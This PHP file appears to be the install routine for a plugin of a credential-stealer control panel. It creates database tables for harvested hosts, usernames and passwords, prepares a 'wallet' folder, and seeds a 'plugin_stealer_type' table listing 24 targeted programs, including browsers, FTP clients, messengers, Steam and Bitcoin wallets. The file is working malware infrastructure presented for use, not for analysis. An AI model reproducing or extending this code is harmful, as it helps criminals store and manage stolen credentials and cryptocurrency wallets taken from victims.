<?php

class de_install
{
    private $MySQL;
    private $PluginName;

    public function __construct()
    {
        include('info.php');

        $this->MySQL = new MySQL(HOST, USER, PASS, DB);
        $this->PluginName = str_replace(' ', '', trim(strtolower($PLUGIN_NAME)));
    }

    public function install()
    {

        $outputPath = dirname(__FILE__).'/wallet/' . 'test' . '.dat';

        $f = @fopen($outputPath, 'w');
        if ($f) {
            $resWrite = fwrite($f, 'test');
            fclose($f);

            if ($resWrite == FALSE) {
                die('Cannot write in folder with fwrite ' . $outputPath);
            }
        } else {
            die('Cannot write in folder ' . $outputPath);
        }


        $this->MySQL->doQuery('CREATE TABLE `plugin_' . $this->PluginName . '` (
                                `ID` INT NOT NULL AUTO_INCREMENT PRIMARY KEY ,
                                `GUID` BINARY(16) NOT NULL ,
                                `host` VARCHAR( 200 ) NOT NULL ,
                                `username` VARCHAR( 100 ) NOT NULL ,
                                `password` VARCHAR( 100 ) NOT NULL ,
								`creationDate` datetime NOT NULL,
								`isPwEncrypted` BOOLEAN NOT NULL DEFAULT \'0\',
                                `fkTypeId` tinyint NOT NULL,
								 UNIQUE KEY `data_unique` (`host`,`username`,`password`)
                                ) ENGINE = MYISAM CHARACTER SET ucs2;
							');

        $this->MySQL->doQuery('CREATE TABLE IF NOT EXISTS `plugin_stealer_type` (
                                `typeId` tinyint NOT NULL PRIMARY KEY ,
                                `typename` VARCHAR( 255 ) NOT NULL 
                                ) ENGINE = MYISAM CHARACTER SET utf8 COLLATE utf8_unicode_ci;
							');

        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (1,  \'Google Chrome\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (2,  \'Mozilla Firefox\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (3,  \'Apple Safari\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (4,  \'Internet Explorer\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (5,  \'Opera\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (6,  \'FileZilla\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (7,  \'Pidgin\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (8,  \'JDownloader\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (9,  \'Gigatribe\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (10,  \'Mozilla Thunderbird\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (11,  \'Windows Key\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (12,  \'FlashFXP\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (13,  \'ICQ\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (14,  \'MSN\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (15,  \'Windows Live\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (16,  \'Outlook\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (17,  \'Paltalk\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (18,  \'Steam\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (19,  \'Trillian\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (20,  \'Minecraft\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (21,  \'DynDNS\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (22,  \'SmartFTP\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (23,  \'WS_FTP\')');
        $this->MySQL->doQuery('INSERT INTO `plugin_stealer_type` (`typeId`, `typename`) VALUES (24,  \'Bitcoin\')');

    }

    public function deinstall()
    {
        $this->MySQL->doQuery('DROP TABLE `plugin_' . $this->PluginName . '`');
        $this->MySQL->doQuery('DROP TABLE `plugin_stealer_type`');
    }
}